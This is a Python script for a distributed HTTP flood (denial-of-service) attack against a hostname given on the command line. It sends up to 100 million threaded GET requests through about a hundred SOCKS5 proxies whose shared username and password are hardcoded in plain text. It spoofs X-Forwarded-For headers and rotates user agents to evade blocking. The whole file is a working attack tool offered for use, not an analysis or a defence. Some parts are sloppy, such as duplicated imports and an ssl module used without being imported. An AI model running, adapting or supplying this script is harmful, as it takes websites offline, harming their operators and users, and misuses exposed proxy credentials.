# -*- coding: utf-8 -*-

import random
import socket
import string
import sys
import threading
import time
from fake_useragent import UserAgent
import ipaddress
from fake_useragent import UserAgent
import ipaddress
import sys
import socks
sys.path.append('/root/flooding/flood_env/lib/python3.11/site-packages')
threading.stack_size(65444)

ua = UserAgent()
ip_pool = [str(ip) for ip in ipaddress.IPv4Network('192.168.0.0/16')]

PROXIES = [
    {'ip': '64.137.65.44', 'port': 6723, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.213.184', 'port': 7024, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.27.246.124', 'port': 7448, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.74.114.187', 'port': 6470, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '31.59.15.253', 'port': 6520, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.127.248.98', 'port': 5099, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.173.105.88', 'port': 5945, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '145.223.57.138', 'port': 6171, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.211.87.115', 'port': 7105, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.143.229.247', 'port': 6175, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '86.38.26.174', 'port': 6339, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.92.77.89', 'port': 6111, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.59.250', 'port': 7374, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.29.249.238', 'port': 8075, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '166.88.238.191', 'port': 6171, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.127.55', 'port': 7020, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.95.250.198', 'port': 6471, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.233.12.116', 'port': 6667, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.42.41', 'port': 6066, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.151.226', 'port': 5719, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '89.249.193.132', 'port': 5870, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.254.225', 'port': 6203, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '194.38.18.38', 'port': 7100, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.24.247.94', 'port': 6928, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.211.87.193', 'port': 7183, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.232.209.253', 'port': 6211, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.127.250.139', 'port': 5748, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.0.51', 'port': 5752, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.252.92.153', 'port': 6087, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '206.206.118.228', 'port': 6466, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.167.164', 'port': 6346, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '138.128.148.25', 'port': 6585, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '155.254.38.22', 'port': 5698, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.29.230.120', 'port': 6961, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '198.37.121.50', 'port': 6470, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.24.247.26', 'port': 6860, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.179.251', 'port': 6310, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.30.250.101', 'port': 5613, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.63.217', 'port': 7242, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.168.118.198', 'port': 6154, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '192.198.126.31', 'port': 7074, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '176.113.66.89', 'port': 5770, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '191.96.69.23', 'port': 5536, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.210.43', 'port': 6413, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.203.42.135', 'port': 5924, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '192.95.91.86', 'port': 5713, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '38.170.188.214', 'port': 5787, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.151.161.37', 'port': 6128, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '84.33.224.140', 'port': 6164, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.13.142', 'port': 6771, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '107.173.93.177', 'port': 6131, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.233.20.151', 'port': 6167, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.144.58', 'port': 5554, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.25.215.51', 'port': 5402, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.93.51', 'port': 7300, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '92.113.119.117', 'port': 6065, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '136.0.182.117', 'port': 6187, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '140.99.199.216', 'port': 6594, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.111.48.209', 'port': 6986, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '184.174.27.35', 'port': 6258, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.138.73', 'port': 6174, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '46.203.202.8', 'port': 5954, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '216.173.72.181', 'port': 6800, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.235.55', 'port': 5379, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.232.209.190', 'port': 6148, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '107.172.163.77', 'port': 6593, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.253.45', 'port': 5720, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.253.183', 'port': 5858, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.26.71.221', 'port': 5704, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '38.153.140.33', 'port': 8911, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.236.170.189', 'port': 9222, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.38.107.70', 'port': 5987, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.239.19.60', 'port': 6737, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '37.44.218.157', 'port': 5840, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.39.50.55', 'port': 6473, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.65.151', 'port': 6665, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.39.25.34', 'port': 5469, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '91.223.126.186', 'port': 6798, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.4.181', 'port': 6728, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.27.138.207', 'port': 6308, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '31.58.30.18', 'port': 6600, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '45.43.64.70', 'port': 6328, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '82.23.215.112', 'port': 7439, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.147.240.71', 'port': 6593, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.4.168', 'port': 6715, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '23.26.71.222', 'port': 5705, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '64.137.77.67', 'port': 5502, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '146.103.1.46', 'port': 5579, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.85.100.67', 'port': 5108, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '185.15.178.68', 'port': 5752, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '193.148.92.25', 'port': 5952, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '64.137.71.167', 'port': 5985, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '92.112.236.118', 'port': 6550, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '154.85.100.96', 'port': 5137, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '81.21.233.168', 'port': 5874, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '85.198.41.140', 'port': 6066, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '89.249.195.39', 'port': 6794, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '104.252.71.187', 'port': 6115, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '142.202.254.108', 'port': 6086, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'},
    {'ip': '148.135.151.125', 'port': 5618, 'user': 'zgxvpqbp', 'pass': '4dl4nb6pmf4r'}
]

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    headers = [
        f"X-Forwarded-For: {random.choice(ip_pool)}",
        f"User-Agent: {ua.random}",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded"  # Added header
    ]
    proxy = random.choice(PROXIES)
    # Create a raw socket
    dos = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    dos.set_proxy(socks.SOCKS5,
                 proxy['ip'],
                 proxy['port'],
                 username=proxy['user'],
                 password=proxy['pass'])

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))
        if port == 443:
            context = ssl.create_default_context()
            ssock = context.wrap_socket(dos, server_hostname=host)
        else:
            ssock = dos


        request = ( 
                "GET /%s HTTP/1.1\r\n" % url_path +
                "Host: %s\r\n" % host +
                "\r\n".join(headers) +
                "\r\n\r\n"
        ).encode()
        ssock.sendall(request)
        #dos.send(request)
        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        #byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        #dos.send(byt)
    except  Exception as e:
        print(f"\n[Error] {proxy['ip']}:{proxy['port']} - {str(e)}")
    finally:
        # Close our socket gracefully
        try:
            if port == 443:
                ssock.shutdown(socket.SHUT_RDWR)
                ssock.close()
            dos.close()
        except:
            pass


print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.0001)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
